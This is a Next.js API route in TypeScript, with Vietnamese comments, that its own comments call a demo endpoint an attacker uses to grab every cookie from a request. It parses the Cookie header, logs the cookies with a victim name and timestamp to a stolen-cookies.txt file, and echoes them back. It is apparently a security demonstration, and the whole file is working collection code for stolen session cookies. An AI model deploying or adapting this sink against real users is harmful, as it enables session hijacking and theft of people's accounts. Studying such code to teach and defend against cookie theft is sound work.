import { NextRequest, NextResponse } from "next/server";
import fs from "fs";
import path from "path";

// API demo: endpoint attacker dùng để lấy TOÀN BỘ cookie từ request
export async function GET(req: NextRequest) {
  const url = new URL(req.url);
  const name = url.searchParams.get("name") ?? "unknown-victim";

  // Cookie mà server thấy từ trình duyệt (Header Cookie)
  const serverCookies = req.headers.get("cookie") ?? "";

  // Chuyển chuỗi cookie "a=1; b=2" thành object JSON { a: "1", b: "2" }
  const cookieObject = serverCookies
    .split(";")
    .map((p) => p.trim())
    .filter(Boolean)
    .reduce<Record<string, string>>((acc, pair) => {
      const [k, ...rest] = pair.split("=");
      if (!k) return acc;
      acc[k] = rest.join("=");
      return acc;
    }, {});

  // Lưu log vào file txt trong thư mục project (dạng JSON lines)
  try {
    // const logPath = path.join(process.cwd(), "public/stolen-cookies.txt");
    const logPath = path.join("/tmp", "stolen-cookies.txt");
    const line = JSON.stringify({
      time: new Date().toISOString(),
      name,
      cookie: cookieObject,
    });
    fs.appendFileSync(logPath, line + "\n", { encoding: "utf8" });
  } catch (e) {
    // eslint-disable-next-line no-console
    console.error("Failed to write stolen-cookies.txt", e);
  }

  return NextResponse.json(
    {
      message:
        "Demo endpoint đã đọc toàn bộ Header Cookie và lưu (dạng JSON) vào stolen-cookies.txt (nếu ghi file thành công).",
      name,
      cookie: cookieObject,
    },
    { status: 200 }
  );
}

